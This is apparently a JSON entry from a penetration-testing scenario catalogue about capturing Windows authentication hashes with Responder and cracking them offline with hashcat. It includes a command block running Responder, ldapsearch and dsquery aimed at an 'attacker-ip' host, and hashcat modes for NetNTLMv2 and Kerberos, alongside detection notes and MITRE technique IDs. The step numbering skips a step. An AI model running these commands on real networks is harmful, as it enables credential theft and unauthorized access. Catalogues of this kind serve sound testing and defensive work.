{
  "title": "Responder Protocol Capture to Offline Crack Mapping",
  "version": "3.0",
  "description": "Protocol-triggered credential captures are classified and immediately routed to matching offline cracking modes.",
  "shortDescription": "Responder Capture Mapping",
  "tags": [
    "password-cracking",
    "responder",
    "netntlmv2",
    "kerberos",
    "collection"
  ],
  "metadata": {
    "descriptionHtml": "<p>This scenario links protocol-auth capture operations to rapid cracking handoff. Authentication events induced through LDAP/HTTP/RDP/WinRM-facing responder services are classified into NetNTLMv2 or AS-REQ families and processed with matching <span style='font-weight:bold;'>hashcat</span> modes.</p>",
    "commandsBlock": "# Step 1: Start capture mode\n$ sudo python3 Responder.py -I eth0 -b\n\n# Step 2: Trigger auth flows\n$ ldapsearch -H ldap://attacker-ip -D 'CN=user,DC=corp,DC=local' -w password\n$ dsquery user -d attacker-ip\n\n# Step 4: Crack by artifact family\n$ hashcat -m 5600 smb-ntlmv2.txt wordlist.txt\n$ hashcat -m 7500 kerberos-asreq.txt wordlist.txt",
    "extraInfo": [
      "Responder protocol capture mode (-b)",
      "Hashcat mode 5600 (NetNTLMv2) and 7500 (Kerberos AS-REQ)"
    ],
    "prerequisites": [
      "Network position allowing poisoning/interception of auth traffic",
      "Victim protocol clients that can be induced to authenticate",
      "Authorized test scope and handling requirements for credential artifacts"
    ],
    "attackerGains": [
      "Captured protocol-specific credential artifacts",
      "Recovered plaintext credentials from immediate crack handoff"
    ],
    "detectionNotes": [
      "Detect rogue responder signatures and unusual name-resolution behavior",
      "Monitor LDAP/WinRM/RDP authentication targeting atypical hosts",
      "Enforce SMB signing and stronger auth controls"
    ],
    "mitreCategories": [
      "T1557.001",
      "T1187",
      "T1110.002",
      "T1078"
    ]
  },
